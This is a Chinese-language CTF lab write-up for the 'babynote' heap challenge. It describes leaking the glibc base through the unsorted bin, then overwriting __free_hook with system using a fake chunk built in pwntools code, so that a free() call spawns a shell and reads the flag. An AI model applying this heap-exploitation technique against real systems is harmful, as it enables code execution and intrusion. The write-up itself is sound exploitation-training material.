# lab_babynote

1. 這題是個heap選單題，而有四個選項，而我的想法是想辦法可以透過 [4.show](http://4.show) 可以去印出記憶體裡面的資訊，然後一開始先看 source code 裡面，每個選項做的事情，然後也嘗試執行並把每個選項 run 過一遍，可以大概知道 1.add_note 跟 2. edit_note 都會建立新的 chunk ，然後 3.delete ，會free 所選的 chunk ，4. show 會 print 出chunk 裡面的 data 資訊。

![截圖 2022-12-07 下午4.38.35.png](lab_babynote%20b0885d49e249438e889de7026c972dcb/%25E6%2588%25AA%25E5%259C%2596_2022-12-07_%25E4%25B8%258B%25E5%258D%25884.38.35.png)

![截圖 2022-12-07 下午4.38.51.png](lab_babynote%20b0885d49e249438e889de7026c972dcb/%25E6%2588%25AA%25E5%259C%2596_2022-12-07_%25E4%25B8%258B%25E5%258D%25884.38.51.png)

![截圖 2022-12-07 下午4.40.04.png](lab_babynote%20b0885d49e249438e889de7026c972dcb/%25E6%2588%25AA%25E5%259C%2596_2022-12-07_%25E4%25B8%258B%25E5%258D%25884.40.04.png)

![截圖 2022-12-07 下午4.40.34.png](lab_babynote%20b0885d49e249438e889de7026c972dcb/%25E6%2588%25AA%25E5%259C%2596_2022-12-07_%25E4%25B8%258B%25E5%258D%25884.40.34.png)

1. 因為 unsorted bin 的 bk 會在 free 的時候指向 glibc 的 base address ，可以利用這點，來 leak 出 glibc 的 base address，然後我開始去嘗試了很多組合，但好像沒有辦法達到我要的效果，因此這邊先按照講師給的提示去堆疊 heap  : 
add(0, “A”*8 ) → edit(0, 0x418, “A”) → add(1, “B”*8) → edit(1, 0x18, “B) → add(2, “C”*8) → delete(0)
    
    ![截圖 2022-12-07 下午5.12.02.png](lab_babynote%20b0885d49e249438e889de7026c972dcb/%25E6%2588%25AA%25E5%259C%2596_2022-12-07_%25E4%25B8%258B%25E5%258D%25885.12.02.png)
    
2. 然後取得 glibc 的 base address ，可以用 gdb 去看它跟 free hook 及 system 之間的距離，可以發現它跟 free_hook 及 system 之間的 offset 分別是 0x1eee48 及 0x52290 ，因此可以利用這些資訊去構造一個 fake chunk 。

```python
show()
r.recvuntil(b'data: ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ecbe0
free_hook = libc + 0x1eee48
system = libc + 0x52290
info(f"libc: {hex(libc)}")
```

```python
data = b'/bin/sh\x00'.ljust(0x10,b'B')
fake_chunk = flat(
    0,  0x21,
    b'CCCCCCCC', b'CCCCCCCC',
    free_hook
    )
```

1. 構造完 fake_chunk 後，將它 edit(1, 0x38, data + fake_chunk) ，可以蓋過，下面的 chunk ，並且把 free_hook 寫進去，然後將 edit( 2, 0x8, p64(system) ) 寫入system 的位址，讓它可以達到呼叫 free 時會變成執行 system(“/bin/sh”) 的效果。

![截圖 2022-12-07 下午5.48.57.png](lab_babynote%20b0885d49e249438e889de7026c972dcb/%25E6%2588%25AA%25E5%259C%2596_2022-12-07_%25E4%25B8%258B%25E5%258D%25885.48.57.png)

![截圖 2022-12-07 下午9.00.11.png](lab_babynote%20b0885d49e249438e889de7026c972dcb/%25E6%2588%25AA%25E5%259C%2596_2022-12-07_%25E4%25B8%258B%25E5%258D%25889.00.11.png)

1. 最後執行 delete(1)，雖然是呼叫 free(B->data)，但實際上是執行 system(“/bin/sh”)，就可以成功取得shell ，並 cat home/chal/flag 來取得FLAG{babynote^_^_de9187eb6f3cbc1dce465601015f2ca0}。
    
    ![截圖 2022-12-07 下午9.16.53.png](lab_babynote%20b0885d49e249438e889de7026c972dcb/%25E6%2588%25AA%25E5%259C%2596_2022-12-07_%25E4%25B8%258B%25E5%258D%25889.16.53.png)